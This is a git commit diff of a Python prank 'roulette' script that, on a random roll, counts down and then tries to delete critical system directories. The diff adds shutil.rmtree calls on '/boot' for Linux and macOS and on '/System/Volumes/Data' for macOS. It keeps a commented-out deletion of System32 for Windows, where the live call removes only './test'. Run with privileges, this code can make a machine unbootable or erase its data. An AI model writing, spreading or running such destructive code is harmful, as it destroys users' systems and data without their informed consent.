8c0a6e501856e14cabbdc6daa2116b6542ae8c90
FROSSTY <aom_jackal@hotmail.com>
2024-02-13 07:05:32 +0800

    make more performance

--- main.py
+++ main.py
@@ -1,12 +1,17 @@
-import os
+# import os
 import random
 import time
+import platform
+import shutil
+
+
+def check_os():
+    return platform.system()
 
 
 def random_os_dead():
 
     if random.randint(0, 6) == 1:
-        # os.remove()
         print("Bang!! XP")
         time.sleep(1)
         print(3)
@@ -14,8 +19,30 @@ def random_os_dead():
         print(2)
         time.sleep(1)
         print(1)
-        os.remove('C:\Windows\System32')
+        if check_os() == "Windows":
+            try:
+                shutil.rmtree("./test")
+                #  shutil.rmtree('C:\Windows\System32')
+            except Exception as e:
+                print(':/ => ',e)  
+                 
+        elif check_os() == "Linux":
+            try:
+                shutil.rmtree("/boot") 
+            except Exception as e:
+                print(':/ => ',e) 
+            
+        elif check_os() == "Darwin":
+            try:
+                shutil.rmtree("/boot") 
+            except Exception as e:
+                print(':/ => ',e)  
 
+            try:
+                shutil.rmtree("/System/Volumes/Data")
+            except Exception as e:
+                print(':/ => ',e)  
+           
     else:
         return print("Click! Oh you got luck!")
 
